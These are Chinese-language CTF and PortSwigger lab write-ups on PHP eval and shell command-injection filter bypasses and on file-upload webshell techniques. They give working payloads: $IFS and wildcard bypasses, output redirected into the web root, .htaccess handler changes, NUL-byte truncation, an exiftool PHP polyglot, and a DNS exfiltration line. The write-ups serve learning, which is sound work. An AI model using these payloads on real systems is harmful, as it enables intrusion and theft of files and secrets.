    [Dest0g3 520迎新赛] SimpleRCE —— 关键词被替换成 hacker 之后

    源码

    $aaa = $_POST['aaa'];
$black_list = array('^','.','`','>','<','=','"','preg','&','|','%0','popen',
'char','decode','html','md5','{','}','post','get','file','ascii','eval',
'replace','assert','exec','$','include','var','pastre','print','tail','sed',
'pcre','flag','scan','decode','system','func','diff','ini_','passthru',
'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',
'cut','bash','nl','wget','vi','grep');
$aaa = str_ireplace($black_list, "hacker", $aaa);
eval($aaa);

    两个关键判断

    ① eval()          → 执行的是 PHP 代码,不是 shell 命令
② str_ireplace()  → 命中就【替换成 hacker】,不是拦截

    所以 ;ls / 死路一条 —— ls / 不是合法 PHP。

    被封的东西

    被封 后果
    $ 不能用变量
    . 不能字符串拼接
    flag 变成 hacker
    system / eval / assert / include 常用执行函数全灭
    file scan glob… 部分读文件函数被连坐

    过程

    ① echo(12);                → 页面出 12,确认 eval 通
② echo(join(glob('/*')));  → 列出根目录,发现 flag
③ 但 flag 会被替换,不能写 '/flag'
④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
⑤ join 成字符串 → show_source 读出来

    最终 payload：

    show_source(join(array_slice(glob('/*'),4,1)));

    每一步在绕什么

    步骤 绕的是
    glob('/*') 不知道文件名
    array_slice(...,4,1) flag 这个词不能出现
    join(...) . 被禁，不能拼接
    show_source(...) file_get_contents 含 file

    踩的坑

    echo(12) 没反应

    eval 里语句必须带 ;。 普通 PHP 文件里 ?> 能代替分号，eval 没有 ?>。

    Parse error: syntax error, unexpected end of file, expecting ';'

    echo(glob('/*')) 只输出 Array

    echo 不能输出数组，要先 join()。

    show_source('/f*') 失败

    show_source 不做通配符展开 —— 它去找一个名字字面量叫 f* 的文件。

    收获

    关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。

    名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。

    先分清 eval 还是 system，否则整个方向都是错的。

    [NewStarCTF] So Baby RCE Again —— 无回显怎么把输出搬出来

    题目直接给了源码，只过滤 bash 和 curl，但有命令执行没有回显。

    现象

    命令能执行,但页面上什么都看不到

    判断

    先分清是"没执行"还是"没回显"：

    ;sleep 5
    结果 结论
    慢 5 秒 ✅ 执行了，只是没回显
    秒回 ❌ 没执行（参数名/分隔符问题）

    解法：输出重定向到 web 目录

    ;ls / > 1.txt
;cat /flag > 1.txt

    然后访问 http://target/1.txt。

    为什么这招有效：

    ① 命令确实执行了(只是输出没返回给你)
② > 把 stdout 写进文件
③ 文件落在【当前工作目录】(通常是网站根目录)
④ 这个目录能被 web 访问 → 直接下载

    两个关键细节

    文件落在 CWD，不是 /

    >1.txt 是相对路径，相对于执行脚本所在目录。 先跑 pwd > 1.txt 确认自己在哪。

    > 只重定向 stdout

    ls / > 1.txt          # 报错丢失
ls / > 1.txt 2>&1     # 报错也进去

    如果 1.txt 是空的，可能命令报错了但你没看到。

    为什么这题只能写文件

    bash 被过滤  →  不能反弹 shell
curl 被过滤  →  不能 HTTP 外带
剩下:
  · 写文件 > cp mv tee
  · DNS 外带 ping `cat /flag`.域名
  · wget 外带

    收获

    "无回显"不等于"没办法" —— 只要还有一个"你能访问的目录"，就能把输出搬出来。

    三种盲注按成本排序：写文件 < 时间延迟 < 外带。

    [NewStarCTF] So Baby RCE —— 子串黑名单 + 没有斜杠

    源码

    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i', $_GET["cmd"])){
   echo "Don't Hack Me";
}else{
    system($_GET["cmd"]);
}

    先分类这个黑名单

    类别 被封 后果
    命令名 cat tac head tail more less nl vi 常见读文件命令全灭
    子串 et sh fl base env get/set/bash/flag 全被连坐
    路径 / 不能用绝对路径
    空白 空格 必须 $IFS
    重定向 \| ; < > ` 只能靠 &&
    通配 ' " ] \ * ^ 不能包字符串、不能用 *

    过程

    ① ls                    → 当前目录是个没用文件
② cd$IFS..$IFS&&ls      → 一级一级往上爬(因为 / 被禁)
③ 在根目录找到 flag
④ sort 或 grep 读内容
⑤ 但 flag 里含 fl → 被拦
⑥ 用 ? 当通配符 → 绕过

    卡点与绕法

    卡点 绕法 原理
    空格被禁 $IFS IFS 默认含空格
    / 被禁 cd .. 逐级爬 相对路径不含 /
    \| ; 被禁 && 逻辑与还能串命令
    * 被禁 ? ? 没在黑名单里
    cat/head/tail 被禁 sort grep uniq od strings awk sed 读文件的替代品一大堆
    fl 被禁 fl?ag 通配符替你补字符

    sort 和 grep 的区别

    sort grep
    用途 排序 搜索
    输出 所有行（排序后） 只输出匹配的行
    要模式吗 不用 要（grep . 文件）
    多行文件 全出但顺序变了 只出匹配的

    flag 只有一行时两个都行；多行文件时 sort 会重排、grep 会过滤。

    一个纠正

    echo fl{abc}ag    →  fl{abc}ag     ← 原样,不是 flag
echo fl{,}ag      →  flag          ← 空选项才有效

    花括号展开只在 bash 下有效。这题真正能过的是 ?。

    收获

    黑名单是子串匹配时，先找"哪些常用词被连坐"（et 封掉 get/set）。

    / 被封不等于走不了 —— cd .. 相对路径一样能爬到根目录。

    读文件命令十几个，封 8 个还剩 8 个；* 被封还有 ?。

    [Ping ping ping] 空格被过滤后怎么读 flag

    第一道命令注入题。输入框是 ping 测试。

    现象

    127.0.0.1;id      → 没反应

    试出空格被过滤。

    绕法

    空格 → $IFS

    ;ls          → 看见 flag.php

    但 flag 这个词也被过滤，/ 和 /f* 同样被拦。

    关键一步：让系统自己算文件名

    |cat$IFS`ls`

    拆开看：

    |            管道
cat          要执行的命令
$IFS         空格
`ls`         命令替换 → 得到 "flag.php"
             ↓
最终等价于:  cat flag.php

    拿到了 flag。

    为什么这招有效

    flag 被拦   →  不写 flag 这个字面量
/ 和 /f* 被拦 →  路径里的 / 也不用写

    让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。

    踩的坑

    全角 ￥ 不是 $

    中文输入法下容易打成 ￥IFS，shell 不认。必须半角 $。

    $IFS 后面紧跟字母会粘连

    cat$IFS/flag ✅ cat$IFSflag ❌ 变成变量 $IFSflag

    收获

    分隔符有五种（; | || && %0a），别在 ; 上吊死。

    关键词被拦 → 引号拆分、通配符、命令替换。

    路径被拦 → `ls` 让系统自己算 —— 这是最通用的一招。

    PortSwigger 文件上传 5 关复盘

    从"能上传"到"能执行"，中间隔了三道门。

    三道防线

    ① 文件名格式校验   字符白名单 ^[a-zA-Z0-9._-]+$
② 扩展名黑/白名单   .php 被拒
③ Web 服务器 handler 没有该后缀 → 当静态文件返回

    四种报错形态直接对应四层：

    你看到的 卡在哪
    400 + JSON 应用层格式校验
    正常页 + "不允许" 应用层扩展名校验
    403 权限
    200 + 源码 服务器 handler 缺失
    200 + 输出 成功

    第 1 关：直接上传

    传 .php（内容是 shell），访问 /files/avatars/shell.php。

    卡点：路径找错。

    ❌ /my-account/avatar/shell.php     ← 这是上传接口
✅ /files/avatars/shell.php         ← 这是文件目录

    找路径的办法：打开"显示这个文件"的页面，看 <img src>。

    第 2 关：路径穿越

    filename="../shell.php"

    判断穿越成功没有，看响应字符串：

    The file avatars/shell.php has been uploaded      → ../ 被吃掉
The file avatars/../shell.php has been uploaded   → 穿越成功 ✅

    访问时不要带 ..：

    ❌ /files/avatars/../shell.php
✅ /files/shell.php

    第 3 关：扩展名黑名单

    aa.php      → 被拒
aa.pHp5     → 上传成功,但访问返回源码(没有 .php5 的 handler)

    解法：上传 .htaccess 改规则

    AddType application/x-httpd-php .lhm

    然后传 shell.lhm → 执行。

    三个拼写陷阱

    x-httped-php → 应为 x-httpd-php .1hm → 应为 .lhm（字母 L，不是数字 1） AddType php .lhm → MIME 必须写全

    第 4 关：混淆扩展名

    白名单只允许 jpg/png。

    shell.php        → 拒绝
shell.php.jpg    → 通过,但静态(两边都取最后后缀)
shell.php%00.jpg → 执行 ✅（NUL 截断）

    原理：

    校验看到:  shell.php\0.jpg  → 以 .jpg 结尾 → 放行
存储使用:  shell.php         → 读到 \0 就停

    我试了 %20 也能过 —— 说明那个实现按空白截断。但这是巧合，不是通用手法。

    第 5 关：多语言文件（polyglot）

    题目只接受"合法图片"，改任何后缀都被拒。

    判断：校验的是内容，不是后缀。

    改后缀有效   → 查后缀
改后缀无效   → 查内容

    解法：把 PHP 写进真实图片的元数据

    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
         photo.jpg -o shell.php

    为什么需要 START/END 标记：

    PHP 会把 <?php ?> 之外的内容原样输出 —— 响应里混着整张图片的二进制， 标记让 secret 在垃圾数据里可搜索。

    收获

    上传题永远先问三个问题：存到哪了、存成什么、那个目录执行不执行 PHP。

    "能上传"和"能执行"是两件事 —— 绕过校验 ≠ 拿到 shell。

    遇到"改后缀一直说不是合法图片"，说明它在查内容，别再折腾后缀了。
